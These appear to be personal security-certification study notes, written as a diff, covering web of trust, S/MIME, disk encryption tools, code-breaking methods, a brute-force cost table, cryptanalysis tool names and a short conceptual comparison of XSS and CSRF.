+		- everyone in the network is a Certificate Authority (CA) and signs for other trusted entities
+		- WOT is a chain of a network in which individuals intermediately validate each other's certificates using their signatures
+		- every user in the network has a ring of public keys to encrypt the data and they introduce many other users whom they trust
+		
+Encrypting Email in Outlook: S/MIME Encryption
+	- uses X.509 certificates
+
+Disk Encryption:
+	Confidentiality
+		- protects the confidentiality of the data stored on disk by converting it into an unreadable code using disk encryption software or hardware
+	Encryption
+		- works in a simlar way as text message encryption and protects data even when the OS is not active
+	Protection
+		- with the use of an encryption program for your disk, you can safeguard any information to burn onto the disk and keep it from falling into the wrong hands
+		
+VeraCrypt
+	- replacement for TrueCrypt
+	- for establishing and maintaining an on-the-fly-encrypted volume (data storage device)
+	- in on-the-fly-encryption, data are automatically encrypted immediately before saving and decrypted immediately after loading without any user intervention
+	
+Disk Encryption Tools:
+	BitLokcer Drive Encryption
+	 - provides offline data and OS protection
+	 - encrypts the entire windows volume
+	FinalCrypt.org
+	Broadcom Encryption (broadcom.com)
+	FileVault (support.apple.com)
+	Gillsoft Full Disk Encryption (gillsoft.com)
+	CheckPoint Full Disk Encryption (checkpoint.com)
+	
+Code Breaking Methodologies
+	- one can measure the strength of an encryption algorithm using various code-breaking techniques
+	
+	Brute Force: keys are discovered by trying every possible combination
+	Frequency Analysis : study of the frequencies of letters or groups of letters in a ciphertext
+		- works based on the fact that in any given stretch of written language, certain letters and combinations of letters occur with varying frequencies
+	Trickery or Deceit: use of social engineering techniques to extract cryptographic keys
+	One-Time Pad: a one-time pad contains many non-repeating groups of letters or number keys, which are chosen randomly
+	
+Brute Force power/cost:
+$2000 PC (an individual) : 
+	5 chars (40 bits) = 1.4 mins
+	7 chars (56 bits) = 73 days
+	8 chars (64 bits) = 50 years
+	16 chars (128 bits) = 10^20 years
+$100,000 machine (a company) :
+	5 chars (40 bits) = 2 sec
+	7 chars (56 bits) = 35 hours
+	8 chars (64 bits) = 1 year
+	16 chars (128 bits) = 10^19 years
+$1,000,000 machine (large company or state) :
+	5 chars (40 bits) = 0.2 sec
+	7 chars (56 bits) = 3.5 hours
+	8 chars (64 bits) = 37 days 
+	16 chars (128 bits) = 10^18 years
+
+Cryptoanalysis Tools:
+	CrypTool
+	Cryptosense (Cryptosense.com)
+	RsaCtlTool (github)
+	Msieve (sourceforge)
+	Cryptol (cryptol.net)
+	CryptoBench (addario.org)
+	
+	
+	=======================================================
+	
+AREAS TO WORK ON:
+
+Difference between XML and Cross-site scripting
+	OBJ-5.2: This scenario is a perfect example of the effects of a cross-site scripting (XSS) attack. If your website's HTML code does not perform input validation to remove scripts that may be entered by a user, then an attacker can create a popup window that collects passwords and uses that information to compromise other accounts further. A cross-site request forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. An XSS will allow an attacker to execute arbitrary JavaScript within the victim's browser (such as creating pop-ups). A CSRF would allow an attack to induce a victim to perform actions they do not intend to perform.
+	
+Cross Site Request Forgery
+SOAP
+hashing/encryption algorithm lengths (128 bit fixed output etc)
+symmetric vs asymmetric encryptions
+
+Cyber Kill Chain
